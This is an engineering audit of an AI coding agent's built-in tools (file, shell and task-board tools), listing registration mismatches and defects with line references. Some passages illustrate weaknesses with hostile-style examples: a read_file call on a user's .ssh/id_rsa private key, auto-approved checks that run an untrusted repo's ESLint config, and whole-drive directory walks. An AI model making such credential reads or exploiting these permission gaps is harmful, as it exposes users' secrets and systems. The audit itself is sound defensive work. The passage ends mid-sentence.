# G10 — Tool Surface Audit (per-tool depth)

**Scope:** `src-tauri/src/agent/builtin_tools/` — 45 files (44 modules + `mod.rs`),
plus `agent/tool_registry.rs`, `agent/tool_trait.rs`, `mcp_server/tool_adapter.rs`,
`mcp_server/server.rs`, `main.rs` registry wiring.

**Method:** every load-bearing claim is anchored `path:line` and comes from reading
the function body, not the docstring. **CONFIRMED** = read in source. **SUSPECTED** =
inferred, stated as such.

**Relationship to G2a:** `G2a-bugs-agent-engine.md` §6 is the *summary* inventory.
This document does not repeat it. It corrects its counts where wrong and goes
per-tool: schema, body, description quality, defect + failure scenario. Findings
owned by G2a are cited by their id (T11…T57); new findings get **G10-nn**.

---

## 1. Registration matrix

### 1.0 What is actually in the directory

45 files = `mod.rs` + **44 modules**:

| Class | Count | Modules |
|---|---|---|
| `Tool` impls, declared **and** registered | **38** | the matrix below |
| Helper modules (no `Tool` impl) | 4 | `validate.rs`, `path_jail.rs`, `path_lock.rs`, `build_evidence.rs` |
| Declared, compiled, registered nowhere | **0** | — |
| **Not declared in `mod.rs` → never compiled** | **2** | `graph_tools.rs` (25 KB), `graph_prompts.rs` (4.4 KB) — G2a T32/G-1 |

38 + 4 + 2 = 44. **No compiled tool is dead**; the only dead code is the two
uncompiled graph modules. CONFIRMED: `mod.rs:6-72` is the complete `pub mod` list
and neither graph module appears in it.

### 1.1 The four registration entry points

| Fn | `mod.rs` lines | Called from | Registers |
|---|---|---|---|
| `register_for_mode(FastDevelopment \| Review)` | `mod.rs:176-235` | `agent/engine.rs:60` | **38** |
| `register_for_mode(Delegate)` | `mod.rs:236-243` | `agent/engine.rs:60` | **4** |
| `register_for_mcp_worker` | `mod.rs:96-164` | `mcp_server/server.rs:151` | **34** |
| `register_all` (= FastDevelopment) | `mod.rs:78-80` | `main.rs:109` | **38** |

Counts are mechanical (`registry.register` occurrences per arm). CONFIRMED.
G2a §6 said 38 / 4 / **33** — the MCP-worker count is **34**.

Every consumer set is a subset of FastDevelopment; there are exactly **38 distinct
tool names in the binary**.

- **`Review` is the same match arm as `FastDevelopment`** (`mod.rs:176`) — the two
  PA modes have byte-identical tool surfaces. Only the system prompt differs
  (`agent/context.rs:78-80`).
- **MCP worker = FastDevelopment − 4**: no `search_memory`, `remember_this`,
  `create_epic`, `create_phased_task`.
- **Delegate = 4**: `create_task`, `planner`, `search_memory`, `remember_this`.
- **Subagent has no registration path of its own.** Subagents are
  core-orchestrator LivingAgents reaching tools through the same MCP server
  (`mcp_server/server.rs:151`), so a subagent surface **is** the worker 34. The only
  per-subagent differentiation is the `__depth` meta-arg
  (`mcp_server/tool_adapter.rs:225-229`). CONFIRMED.

### 1.2 The matrix

`MCPw` = fleet worker **and** subagent. `cfg` = listed in the 25-name tool list in
`submodules/core-orchestrator/autodev_mcp_config.yaml:29-56`.

| # | Tool name (as the LLM sees it) | Module | read_only | Fast | Review | Delegate | MCPw | cfg |
|---|---|---|---|---|---|---|---|---|
| 1 | `read_file` | `read_file.rs` | true | Y | Y | – | Y | Y |
| 2 | `write_file` | `write_file.rs` | false | Y | Y | – | Y | Y |
| 3 | `edit_file` | `edit_file.rs` | false | Y | Y | – | Y | Y |
| 4 | `append_file` | `append_file.rs` | false | Y | Y | – | Y | Y |
| 5 | `check_file` | `check_file.rs` | true | Y | Y | – | Y | Y |
| 6 | `list_directory` | `list_directory.rs` | true | Y | Y | – | Y | Y |
| 7 | `grep` | `grep.rs` | true | Y | Y | – | Y | Y |
| 8 | `glob` | `glob.rs` | true | Y | Y | – | Y | Y |
| 9 | `bash` | `bash.rs` | false | Y | Y | – | Y | Y |
| 10 | `list_tasks` | `list_tasks_tool.rs` | true | Y | Y | – | Y | Y |
| 11 | `get_task` | `get_task_tool.rs` | true | Y | Y | – | Y | Y |
| 12 | `create_task` | `create_task.rs` | false | Y | Y | **Y** | Y | Y |
| 13 | `assign_task` | `assign_task.rs` | false | Y | Y | – | Y | Y |
| 14 | `assign_tasks` | `assign_tasks_batch.rs` | false | Y | Y | – | Y | **–** |
| 15 | `update_task_status` | `update_task_status_tool.rs` | false | Y | Y | – | Y | Y |
| 16 | `claim_task` | `claim_task_tool.rs` | false | Y | Y | – | Y | Y |
| 17 | `set_task_budget` | `set_task_budget_tool.rs` | false | Y | Y | – | Y | Y |
| 18 | `create_epic` | `create_epic_tool.rs` | false | Y | Y | – | **–** | – |
| 19 | `create_phased_task` | `create_phased_task_tool.rs` | false | Y | Y | – | **–** | – |
| 20 | `get_epic_progress` | `get_epic_progress_tool.rs` | true | Y | Y | – | Y | Y |
| 21 | `get_ready_tasks_in_phase` | `get_ready_tasks_in_phase_tool.rs` | true | Y | Y | – | Y | Y |
| 22 | `suggest_worker` | `suggest_worker_tool.rs` | true | Y | Y | – | Y | Y |
| 23 | `request_supervisor_action` | `request_supervisor_action.rs` | false | Y | Y | – | Y | Y |
| 24 | `list_worker_requests` | `list_worker_requests_tool.rs` | true | Y | Y | – | Y | **–** |
| 25 | `resolve_worker_request` | `resolve_worker_request_tool.rs` | false | Y | Y | – | Y | **–** |
| 26 | `send_worker_message` | `send_worker_message.rs` | false | Y | Y | – | Y | **–** |
| 27 | `list_worker_messages` | `list_worker_messages.rs` | false | Y | Y | – | Y | **–** |
| 28 | `acknowledge_worker_message` | `acknowledge_worker_message.rs` | false | Y | Y | – | Y | **–** |
| 29 | `planner` | `planner.rs` | false | Y | Y | **Y** | Y | Y |
| 30 | `spawn_subagent` | `spawn_subagent.rs` | false | Y | Y | – | Y | Y |
| 31 | `spawn_parallel_subagents` | `spawn_parallel_subagents.rs` | false | Y | Y | – | Y | Y |
| 32 | `spawn_qc_review` | `spawn_qc_review.rs` | false | Y | Y | – | Y | **–** |
| 33 | `write_interface_spec` | `write_interface_spec.rs` | false | Y | Y | – | Y | **–** |
| 34 | `e2e_probe` | `e2e_probe.rs` | false | Y | Y | – | Y | **–** |
| 35 | `analyze_diff` | `analyze_diff_tool.rs` | **true** | Y | Y | – | Y | Y |
| 36 | `annotate_file` | `annotate_file_tool.rs` | false | Y | Y | – | Y | Y |
| 37 | `search_memory` | `search_memory.rs` | true | Y | Y | **Y** | **–** | – |
| 38 | `remember_this` | `remember_this.rs` | false | Y | Y | **Y** | **–** | – |
| — | `graph_*` (5 tools) | `graph_tools.rs` | – | **NOT COMPILED — unreachable by every consumer** | | | | – |

**COUNTS: FastDevelopment 38 · Review 38 · Delegate 4 · MCP worker 34 · Subagent 34.**

The owner recollection of "21 or 29" matches nothing in the current tree. The
nearest historical anchors are the **25** names in `autodev_mcp_config.yaml` and the
**19** listed in the `mcp_server/server.rs:126-149` doc comment.

### 1.3 Registration defects

**G10-01 (HIGH, CONFIRMED) — `main.rs` builds a 38-tool registry, hands it to the
MCP server which throws it away, and the UI then displays that discarded registry
as the worker tool surface.**
`main.rs:108-110` builds `mcp_registry` via `register_all` (38). It is `.manage()`d
at `main.rs:184` and passed to `start_mcp_server` at `main.rs:241`.
`mcp_server/server.rs:148-152` discards it — literally `let _ = registry;` — and
builds its own 34-tool registry. But `commands/sidecar_commands.rs:311-327`
(`list_mcp_tools`, the frontend MCP tool browser) reads the **managed 38-tool
registry**. *Failure:* the panel advertises `search_memory`, `remember_this`,
`create_epic`, `create_phased_task` over MCP; a worker calling any of them gets
`Tool 'x' not found in autodev-mcp-server` (`tool_adapter.rs:232-237`). A recipe
author reading the browser writes a step that fails on every tick.

**G10-02 (MEDIUM, CONFIRMED) — the `server.rs` doc comment describing the worker
surface is 9 tools short and names an exclusion that is not a tool.**
`mcp_server/server.rs:126-149` enumerates 19 tools and claims `validate` is a tool
that is "NOT exposed" — `validate.rs` has no `Tool` impl at all. Omitted from the
comment but actually exposed: `assign_tasks`, `spawn_qc_review`,
`write_interface_spec`, `e2e_probe`, `list_worker_requests`,
`resolve_worker_request`, `send_worker_message`, `list_worker_messages`,
`acknowledge_worker_message`.

**G10-03 (MEDIUM, CONFIRMED) — `autodev_mcp_config.yaml` declares 25 tools; the
server serves 34.** Missing 9: `assign_tasks`, `spawn_qc_review`,
`write_interface_spec`, `e2e_probe`, `list_worker_requests`,
`resolve_worker_request`, `send_worker_message`, `list_worker_messages`,
`acknowledge_worker_message` (`autodev_mcp_config.yaml:29-56`). The file says the
list "is informational — actual discovery happens via tools/list" (`:20`), so it is
drift, not a hard block — **but the Supervisor recipe Step 1a depends on
`list_worker_requests` and the whole ACP protocol depends on the three
`*_worker_message` tools**, none declared. Any orchestrator-side allowlisting of the
declared set silently disables the escalation queue and ACP.

**G10-04 (MEDIUM, CONFIRMED drift / SUSPECTED runtime impact) — the shipped copy of
the config uses a different server `id` from the source copy, and every agent card
requires the source spelling.**
`submodules/core-orchestrator/autodev_mcp_config.yaml:16` → `id: autodev-mcp-server`.
`src-tauri/resources/sidecars/core-orchestrator/autodev_mcp_config.yaml:16` →
`id: mcp-autodev`. The files are otherwise byte-identical (`diff` returns only that
line). Every live agent card requires the first spelling with `required: true`
(`config/agents/supervisor.yaml:18-19`; same in `worker-backend.yaml`,
`worker-frontend.yaml`, `worker-mcp.yaml`, `worker-platform.yaml`,
`worker-cleanup.yaml`, `qc-agent.yaml`). *Failure:* if the packaged build loads the
resources copy, no server named `autodev-mcp-server` exists and every worker fails
its required-server precondition — the fleet has tools in dev and none when
installed. Runtime half is SUSPECTED: selection is via `MCP_CONFIG_FILE` on the
orchestrator side, and **no Rust file references `autodev_mcp_config` or
`MCP_CONFIG_FILE`** (grep over `src-tauri/src` returns zero hits), so nothing on the
Rust side pins which copy wins.

### 1.4 Does Delegate mode match the product promise?

Promise, from the mode own prompt (`agent/context.rs:267`, `:302-303`): *"You have
NO file access tools… ## Available Tool — create_task(...)"* — singular.

Registered (`mod.rs:236-243`): `create_task`, `planner`, `search_memory`,
`remember_this`.

**G10-05 (HIGH, CONFIRMED) — Delegate mode is not "create_task + read-only MCP
tools": it silently carries two write tools the prompt says do not exist.**
- `planner` — `is_read_only()` false; it mutates plan state (§2.3). `mod.rs:238`
  justifies it as "task management, not file I/O".
- `remember_this` — a memory **write** tool.
- Neither, nor `search_memory`, appears in the prompt "Available Tool" section. The
  model receives four tool schemas and a prompt asserting it has one; the schema is
  the stronger signal, so Delegate runs will call tools the prompt denies having.
- The narrow claim "no file tools" **does** hold: no `read_file`, `write_file`,
  `edit_file`, `append_file`, `bash`, `grep`, `glob`, `list_directory`,
  `check_file`. Delegate also gets **no read-only task-board tools** — it has no
  `list_tasks` / `get_task`, so it can create tasks it cannot read back, and cannot
  answer "what did you already file?" without hallucinating.

**G10-06 (MEDIUM, CONFIRMED) — `Review` mode has no tool-surface meaning.**
`mod.rs:176` fuses `FastDevelopment | Review` into one arm: Review mode can
`write_file`, `bash`, `e2e_probe`, `spawn_qc_review`. The Review prompt
(`agent/context.rs:248`) only *advises* "prefer read-only exploration first". The
`mod.rs:167` comment defers safety to "the permission layer at execution time" —
§3.4 shows that layer does not distinguish the modes either.

---

## 2. Per-tool audit

Each entry: **name / file · purpose + schema · what the body actually does ·
description quality · defects**. New defect ids are `G10-nn`; ids of the form `Tnn`
belong to G2a and are referenced, not restated.

### 2.1 File ops

---

#### `read_file` — `read_file.rs`

**Schema** `{path: string (required), start_line: int≥1, end_line: int≥1}`.
**Body** (`read_file.rs:62-193`): resolves relative paths against `ctx.working_dir`
(`:196-199`), fires the `PreFileRead` hook and honours a veto (`:91-94`), applies a
256 000-byte guard **only when no range is given** (`:99-114`), reads the whole file
with `std::fs::read_to_string`, splits into lines, refuses a no-range read over 800
lines (`:128-141`), then emits `from..to` with `to = requested_to.min(from+2000)`
(`:149`) formatted as `{:>4} | line`.

**Description quality — good.** It states both caps and the paging protocol, and the
error messages restate them with a concrete retry call. This is the best-written
description in the tree.

**Defects**
- **T12 (given)** — no `path_jail`. `read_file(path="C:/Users/<u>/.ssh/id_rsa")`
  succeeds; the tool is also auto-approved (§3.4). CONFIRMED.
- **G10-07 (HIGH, CONFIRMED) — the byte guard is bypassed by supplying any range,
  and the line caps do not bound bytes.** `has_range` (`:99`) disables the 256 KB
  check, and the 800/2000-line caps count *lines*. A minified bundle or a JSON
  fixture is one line. `read_file(path="dist/bundle.js", start_line=1, end_line=1)`
  returns the entire multi-megabyte file into the context window — the exact failure
  the guard at `:96-98` was written to prevent.
- **G10-08 (LOW, CONFIRMED)** — the whole file is read into memory before the
  line-range slice (`:116`), so a 2 GB file is fully buffered even for a 10-line read.

---

#### `write_file` — `write_file.rs`

**Schema** `{path, content (required), overwrite: bool}`.
**Body**: resolve (`:62`) → **jail** (`:70-73`) → **per-path lock** (`:83`) →
refuse-on-exists unless `overwrite` (`:95-105`) → `create_dir_all` (`:108`) →
`auto_checkpoint_before_write` (`:115`) → `std::fs::write` → spawn `PostFileWrite`
hook (`:142`) → **four** validators run inline: `tier1_syntax`, `tier2_imports`,
`tier2_5_exports`, `tier2_6_api_contract` (`:150-192`) → success string with
`⚠ Lint feedback` appended.

**Description quality — good but incomplete.** It documents refuse-on-exists,
`overwrite`, and parent-dir creation. It does **not** mention that the call runs four
validators and can therefore take seconds, nor that the file is checkpointed. An
agent that reads the description has no idea a `write_file` of a `.ts` file spawns
`tsc`.

**Defects**
- **G10-09 (HIGH, CONFIRMED) — the per-path lock is keyed differently here than in
  `edit_file`, so the two tools do not mutually exclude.** `write_file.rs:83` locks
  on `&resolved` — the *pre-jail* joined path. `edit_file.rs:108` locks on
  `&file_path` — the **canonicalised** path returned by the jail. `append_file.rs:83`
  also uses the canonical form. `path_lock::lock_key` (`path_lock.rs:75-84`) is
  purely *lexical*: it never canonicalises and never case-folds. Whenever
  canonicalisation changes the string — a symlinked workspace root, a workspace
  configured with different casing than the on-disk name (routine on Windows), an
  8.3 short name, a `\\?\` form, a trailing separator — `write_file` and `edit_file`
  take **two different mutexes for the same file**, and the lost-update race the
  module exists to prevent happens anyway. The comment at `write_file.rs:80-82`
  asserts "lock_key normalises both forms to the same slot", which is false for
  every case canonicalisation touches. *Scenario:* workspace configured as
  `c:\airs foundry\proj`, disk casing `C:\AIRS Foundry\proj`; worker A `edit_file`s
  `src/app.ts` while worker B `write_file`s it with `overwrite=true`; both proceed
  concurrently and A's edit is lost.
- **G10-10 (HIGH, CONFIRMED) — the lock is held across untimed subprocesses.** The
  guard from `:83` lives to the end of `execute`, and `:150` awaits
  `validate::tier1_syntax`, which for `.ts/.tsx/.jsx` spawns `tsc`
  (`validate.rs:269-283`) with **no timeout** (T53). A hung or interactive `tsc`
  therefore blocks *every* writer of that path in the whole process, forever. This
  is the "lock held across an await that can block indefinitely" case.
- **G10-11 (MEDIUM, CONFIRMED) — `overwrite=true` bypasses nothing else.** The
  refuse-on-exists guard is the only protection; there is no diff, no size sanity
  check, and the checkpoint at `:115` is fire-and-forget with no error surfaced
  (`auto_checkpoint_before_write` returns `()`), so a failed checkpoint is invisible
  and the overwrite proceeds regardless.
- **G10-12 (LOW, CONFIRMED)** — `content` is written verbatim with no newline
  normalisation; on Windows the agent's `\n`-only content mixes with CRLF files
  edited by other tooling.

---

#### `edit_file` — `edit_file.rs`

**Schema** (serde-derived, `:16-23`) `{path, old_string, new_string (required),
replace_all: bool}`. This is one of only four tools using `serde::Deserialize` for
its input, so a missing field yields `Invalid input: missing field ...` instead of a
silent default.
**Body**: resolve (`:81-85`) → jail (`:90`) → lock on the canonical path (`:108`) →
`read_to_string` with a `NotFound` special case pointing at `write_file` (`:118-124`)
→ `matches().count()` → 0-match and >1-match error branches → `replace`/`replacen`
→ checkpoint → `fs::write` → `PostFileWrite` hook → `tier1_syntax` (only tier 1).

**Description quality — good.** Exact-match requirement, multi-match failure, and
the `replace_all` escape hatch are all stated. **One critical omission**: it does not
say that `old_string` must be non-empty, and the schema does not say so either
(`minLength` is absent).

**Defects**
- **T14 (given) — infinite loop on `old_string=""`.** Precise mechanism, which the
  summary did not record: `content.matches("")` returns `len+1` matches, so
  `match_count > 1` and control enters the **error-reporting** branch at `:150-156`.
  There `content[start..].find("")` returns `Some(0)` on every iteration and
  `start += pos + params.old_string.len()` adds **zero**, so the `while let` never
  terminates and `positions` grows without bound — the process spins one core and
  climbs to OOM. It is not the replacement that loops; it is the code that formats
  the "found N times" error.
- **T15 (given)** — `replace_all=true` + `old_string=""` skips that branch and calls
  `content.replace("", new)`, which inserts `new_string` between every character.
- **G10-13 (MEDIUM, CONFIRMED)** — `is_read_only()=false` but the tool returns
  `success` with a `✓ Edited` string that reports `old_lines → new_lines`
  (`:222-229`); when `new_string == old_string` the tool reports a successful edit
  having changed nothing, and the agent believes its fix landed.
- Shares **G10-10** (tier-1 lint under the lock, `:215`).

---

#### `append_file` — `append_file.rs`

**Schema** `{path, content (required), newline: bool (default true)}`.
**Body**: resolve → jail (`:73`) → lock on the canonical path (`:83`) →
`create_dir_all` → `OpenOptions{read,create,append}` → probe last byte through the
same handle (`:118-130`) → optional leading `\n` → `write_all`.

**Description quality — adequate**, but it **omits that no checkpoint is taken**,
which matters because every other write path is undoable and this one is not.

**Defects**
- **T36 (given)** — no `auto_checkpoint_before_write`, no `PostFileWrite` hook. So
  appends are invisible to the graph engine, telemetry, and the rollback system, and
  `append_file` is the one write tool whose changes cannot be undone.
- **G10-14 (LOW, CONFIRMED)** — no lint pass either, so `append_file` is the
  documented way to break a `package.json` without hearing about it (the
  `tier1_syntax` JSON parse that `write_file` runs is simply not called here).

---

#### `check_file` — `check_file.rs`

**Schema** `{path (required), checks: enum[] ["syntax","imports","exports","contract","types"], type_checker: enum ["auto","mypy","pyright","tsc","eslint"]}`.
**Body** (`:74-247`): resolve, existence check, parse `checks` (unknown values are
silently dropped, `:99-105`), then run the requested tiers from `validate.rs` and
join the sections. Returns `is_error=true` iff some tier produced an
**error**-severity diagnostic.

**Description quality — actively misleading in two places.**
1. It lists the syntax tier as "py_compile for .py, node --check for .js/.mjs/.cjs"
   and never mentions that `.ts/.tsx/.jsx` spawn a full `tsc --noEmit` run
   (`validate.rs:267-283`) — the slowest thing the "always fast" tier does.
2. "Run lint / syntax / import checks on a file **without executing it**" — true of
   the target file, false of the workspace: see G10-15.

**Defects**
- **G10-15 (HIGH, CONFIRMED) — `check_file` is marked `is_read_only()=true` and
  `requires_permission()=false` (`:71-72`) yet it executes workspace-controlled
  code.** `checks:["types"]` on a `.js/.jsx` file runs `eslint`
  (`validate.rs:801-808`) in `working_dir`; ESLint flat config (`eslint.config.js`)
  is JavaScript that Node executes at startup. `.py` files run `py_compile`, which
  **writes** `__pycache__/*.pyc` into the source tree (`validate.rs:186-188`) — a
  filesystem mutation from a tool declared read-only. *Scenario:* a worker checks
  out an untrusted repo and calls `check_file(path="a.js", checks=["types"])`; the
  repo's `eslint.config.js` runs with the app's privileges, no permission prompt,
  because the tool is read-only and read-only tools are auto-approved (§3.4).
- **G10-16 (HIGH, CONFIRMED) — false green when the checker is missing.**
  `LintResult::is_clean()` (`validate.rs:35-37`) ignores **warning**-severity
  diagnostics, and every "tool not installed" degradation is emitted as a *warning*
  (`validate.rs:271-281`, `:190-200`, `:222-232`, `:818-828`). `check_file` prints
  the fixed string `"[tsc_check] ✓ No syntax errors."` (`:123`) in that case and
  **discards the warning entirely**. On any machine without `tsc` on `PATH` — which
  on Windows is *every* machine where TypeScript was installed via npm, because
  `Command::new("tsc")` cannot find a `.cmd` shim (T54) — `check_file` reports a
  clean TypeScript file that was never checked. `write_file` does not have this bug
  (it tests `diagnostics.is_empty()` at `write_file.rs:151`), so the two tools
  disagree about the same file.
- **G10-17 (MEDIUM, CONFIRMED)** — no path jail; `check_file` will happily run a
  type checker against any absolute path on the machine.

---

#### `list_directory` — `list_directory.rs`

**Schema** `{path?: string, recursive?: bool, max_entries?: int}` — **no required
fields**; `path` defaults to `ctx.working_dir`.
**Body** (`:40-142`): existence + is-dir checks, then `collect_entries` with
`max_depth = 3` when recursive else `1`; a hardcoded `SKIP` list (`:84-87`); output
is a JSON object `{path, entries[], truncated}`.

**Description quality — poor.** One sentence. It does not mention the depth limit,
the 500-entry default, the skip list, or that `path` is optional — all of which
change how the agent should call it. It also promises `size_bytes` unconditionally,
while `:132-134` only inserts the key for files.

**Defects**
- **T11 (given), sharpened** — `max_entries` is checked **only on entry** to
  `collect_entries` (`:98`), never inside the `for` loop (`:108-141`). One directory
  containing 20 000 files therefore emits all 20 000 entries. `truncated` is then
  computed as `entries.len() == max_entries` (`:61`) — an **exact equality** — so in
  that case it reports `truncated: false` and no hint is attached. The tool
  simultaneously blows the context window and denies that it truncated anything.
- **T13 (given)** — no jail; `list_directory(path="C:/Users")` enumerates the machine.
- **G10-18 (LOW, CONFIRMED)** — relative paths are rendered with
  `entry_path.display()` (`:123`), i.e. `src\foo.rs` on Windows, while `grep`/`glob`
  normalise to `/`. The agent sees two path dialects from two tools in one session.
- **G10-19 (LOW, CONFIRMED)** — the `SKIP` list here (`.git, node_modules, target,
  __pycache__, .venv, venv, dist, build, .airs`) differs from `grep`/`glob`
  (`node_modules, .git, target, dist, build, .next, .cache`). Neither reads
  `.gitignore`.

---

#### `grep` — `grep.rs`

**Schema** (serde) `{pattern (required), path?, case_insensitive?, glob?,
context_lines? (default 1), max_results? (default 100)}`.
**Body** (`:113-283`): compiles `regex::Regex`, prefixing `(?i)` when
`case_insensitive`; walks with `WalkDir` (`follow_links(false)`), skipping a
hardcoded dir list; optional glob filter matched against the relative path *or* the
file name; `fs::read_to_string` per file (errors skipped); per line `find_iter`;
collects `context_before` / `context_after`; stops at `max_results` **matches**.

**Description quality — one outright false claim.**
"**Skips binary files**" — there is no binary detection anywhere in the file. What
actually happens is that `fs::read_to_string` fails on non-UTF-8 bytes and the file
is `continue`d (`:191-194`). A binary that happens to be valid UTF-8 is searched; a
UTF-16 text file is skipped as if binary. The claim also omits that
`.next`/`.cache` are skipped and `.venv`/`__pycache__` are **not**.

**Defects**
- **T13 (given)** — no jail; `path` may be any absolute path.
- **G10-20 (HIGH, CONFIRMED) — the result cap counts matches, not bytes, and
  `context_lines` is unbounded.** `context_lines: 5000` with `max_results: 100`
  returns up to 100 × 10 001 lines. Even at defaults, one match inside a 3 MB
  single-line minified file returns that entire line as `line_content` (`:216`).
  There is no per-line, per-file, or total-byte cap anywhere in the tool.
- **G10-21 (MEDIUM, CONFIRMED) — unbounded walk with no timeout.**
  `grep(pattern="zzz", path="C:/")` walks the whole drive; nothing caps the walk,
  and the `bash` 120 s timeout does not apply because this is a native tool.
- **G10-22 (LOW, CONFIRMED)** — `.replace('\\', "/")` on the relative path (`:177`)
  corrupts legitimate backslashes in filenames on Linux (P12).

---

#### `glob` — `glob.rs`

**Schema** (serde) `{pattern (required), path?, max_results? (200),
include_metadata? (false)}`.
**Body** (`:94-204`): `glob::Pattern::new`, `WalkDir` with the same hardcoded skip
list as `grep`, match on relative path **or** bare file name (`:138-139`), stop at
`max_results`, sort, emit compact JSON.

**Description quality — contains a false promise.**
"**Automatically respects .gitignore** and skips common noise directories."
`.gitignore` is never opened; the only filter is the 7-entry `skip_dirs` array
(`:115`). T33. An agent trusting this will conclude that a file surfaced by `glob`
is tracked, and will "fix" generated artefacts under `coverage/`, `.venv/`,
`out/`, `__pycache__/` — none of which are skipped.

**Defects**
- **T33 (given)** — `.gitignore` claim is false.
- **T13 (given)** — no jail.
- **G10-23 (LOW, CONFIRMED)** — matching the bare file name as a fallback means
  `pattern="*.rs"` silently behaves as `**/*.rs`, so a model trying to list only the
  top-level `.rs` files cannot express that.
- Shares **G10-21** (unbounded walk on an absolute `path`).

---

### 2.2 Execution

---

#### `bash` — `bash.rs`

**Schema** `{command (required), timeout_secs?: int (default 120)}`.
**Body** (`:48-160`): jail-check the cwd (`:62`) → `check_redirect_targets`
heuristic (`:75`) → on Windows `rewrite_for_windows` (`:80`) → spawn
`cmd /C <command>` (Windows) or `sh -c <command>` → `tokio::time::timeout` around
`run_command` (`:99-102`) → `build_evidence::record` (`:114`) → label STDOUT/STDERR →
tail-truncate at 50 000 bytes (`:131-143`) → Windows exit-255 suggestion (`:149`).

**Description quality — self-contradictory on Windows.** The Windows string
(`:23`) says "The shell is Windows CMD… Avoid Unix-only utilities (`head`, `tail`,
`jq`, `grep` in pipes). Use PowerShell-compatible alternatives" — instructing the
model to write PowerShell for a `cmd` shell. The exit-255 suggestion (`:151-153`)
repeats the same bad advice. The non-Windows description (`:25`) mentions **no**
timeout, no output cap, and no redirect restriction, so the model has no way to know
that `> /dev/null` will be refused or that output is silently tail-truncated.

**Defects**
- **T16 / T17 / T18 / T19 (given).** T17 confirmed at `:427-429`: `" | grep "` is
  replaced before `" | grep -i "`, so the `-i` arm is unreachable. T18 confirmed at
  `:134-141`: `find('\n')` yields a char boundary but the `unwrap_or(tail_start)`
  fallback is a raw byte index, and `&output[boundary..]` panics on a multi-byte
  character — reachable whenever 50 KB of output contains no newline (a progress bar,
  a minified bundle dumped to stdout).
- **G10-24 (HIGH, CONFIRMED) — a timed-out command is never killed.**
  `run_command` uses `cmd.output().await` (`:187`) on a `tokio::process::Command`
  with `kill_on_drop` unset. On timeout, `timeout()` drops the future and the tool
  returns "Command timed out after 120s" — but the child (and on Windows the whole
  `cmd /C` subtree) **keeps running** with its pipes closed. *Scenario:* the agent
  starts `npm run dev`, times out at 120 s, retries, times out again; three dev
  servers now hold the port and keep writing to the workspace while the agent is
  told nothing is running.
- **G10-25 (HIGH, CONFIRMED) — a timed-out command records no build evidence.**
  `build_evidence::record` is only reached in the `Ok(Ok(..))` arm (`:114`). A
  `cargo test` that legitimately exceeds 120 s therefore leaves no evidence, and the
  subsequent `update_task_status(qc_review)` is refused with "no recorded build
  evidence" — the gate punishes exactly the long builds it most wants to see.
- **G10-26 (MEDIUM, CONFIRMED) — the redirect scanner refuses `/dev/null`.**
  `check_redirect_targets` (`:283-300`) validates any `>`/`>>`/`tee` target against
  the workspace jail. `cmd 2>/dev/null` and `... > /dev/null` are among the most
  common shell idioms; both resolve outside the workspace and are refused with "The
  command was not executed." On Windows `> NUL` resolves to `<ws>\NUL`, a reserved
  device name, whose behaviour under `canonicalize` is undefined-ish. The model has
  no way to learn this from the description and will retry the same command.
- **G10-27 (MEDIUM, CONFIRMED) — the 50 KB cap truncates the *combined* buffer after
  concatenation**, so a 60 KB stdout plus a 200-byte stderr keeps the stderr but a
  200-byte stdout plus 60 KB of stderr silently discards the `=== STDOUT ===` header
  and every line of program output. Truncation is announced in the text but the
  agent cannot tell which stream was cut.
- **G10-28 (LOW, CONFIRMED)** — `timeout_secs` is unvalidated `as_u64`;
  `timeout_secs: 86400` is accepted, so a model can pin a worker for a day.
- **Windows evidence bug (MEDIUM, CONFIRMED):** `build_evidence::record` receives
  the **rewritten** command (`:114` uses the shadowed `command` from `:79-87`), so
  what is stored as proof of a build is not what the agent asked to run.

---

#### `e2e_probe` — `e2e_probe.rs`

*(covered in §2.7 QC/verification — it is a verification tool, not a general
execution tool)*

---

### 2.3 Task board

---

#### `create_task` — `create_task.rs`

**Schema** `{title, priority (enum p0-p3), task_type (enum), acceptance_criteria}`
all four required; `description` optional.
**Body** (`:54-114`): validates non-empty title ≤120, non-empty acceptance criteria,
`TasksDb::create(created_by="pa")`, then `scheduler::kick("supervisor")` and a
`task:changed` UI event.

**Description quality — makes a runtime promise the tool cannot keep.**
"The task enters with status 'ready' and **will be picked up by the Supervisor within
2 minutes**." Nothing in `execute` checks that the supervisor recipe is enabled,
that the scheduler is running, or that the orchestrator sidecar is up; `kick` is
fire-and-forget. In Delegate mode with the fleet stopped the task sits forever while
the tool has told the user it is dispatched. The success `message` (`:110`) repeats
the promise, so it lands in the transcript as fact.

**Defects**
- **G10-29 (MEDIUM, CONFIRMED)** — `priority` and `task_type` are `required` in the
  schema but **defaulted** in the body (`:63-64`, `unwrap_or("p2")` /
  `unwrap_or("feature")`), and the values are never checked against the enums. A
  model that sends `priority:"high"` writes `"high"` into the board; the kanban and
  every `priority.as_str()` consumer then sees an out-of-enum value.
- **G10-30 (LOW, CONFIRMED)** — `title.len() > 120` (`:59`) counts **bytes**, so a
  40-character CJK or emoji title is rejected with "title must be 120 characters or
  less".

---

#### `list_tasks` — `list_tasks_tool.rs`

**Schema** `{status?: enum(9), compact?: bool (default true)}` — no required fields.
**Body**: `db.list(status_filter)` then maps to compact or full JSON.

**Description quality — good on intent, silent on the one thing that matters.** It
explains compact mode "to avoid token bloat" but there is **no `limit` and no
pagination**, and the description does not say so.

**Defects**
- **G10-31 (MEDIUM, CONFIRMED)** — unbounded result set. `db.list` returns every
  matching row; a mature board (thousands of tasks) returns hundreds of KB in one
  tool result. `compact` reduces per-row size by ~6× but the row count is uncapped.
  Every other list-shaped tool in the tree (`grep`, `glob`, `list_directory`) has a
  cap; this one does not.
- **G10-32 (LOW, CONFIRMED)** — `status` is not validated against the enum; an
  unknown status silently returns zero tasks rather than an error, so the model
  concludes the board is empty.

---

#### `get_task` — `get_task_tool.rs`

**Schema** `{id: integer}` required. **Body**: positive-integer check, fetch, emit
the full record. Clean, correct, no defects found. The only nit is that a
non-existent id returns `is_error=true`, which is arguably a legitimate answer to a
query rather than an error.

---

#### `update_task_status` — `update_task_status_tool.rs`

**Schema** `{id (int, required), status (enum of 9, required), assigned_worker?,
rejection_reason?}`.
**Body** (`:55-285`): state-transition guardrails (`ready` must have no worker;
`assigned`/`in_progress` must have one; slug ∈ `FLEET_WORKERS`; `rejected` needs a
reason), then the **build-evidence gate** (`:133-162`), then the DB update, the
scheduler kicks, UI events, and lifecycle hooks.

**Description quality — omits the gate entirely.** The one thing that will refuse
the call — "you cannot move to `qc_review` without build evidence in this session" —
is not mentioned. The model only learns the rule by triggering it. It also lists
`build_failed` as a valid status without saying it is the required destination when
a build fails, which the gate's error message *does* say.

**Defects**
- **T50 (given), with the full mechanism.** The gate is `if status == "qc_review" &&
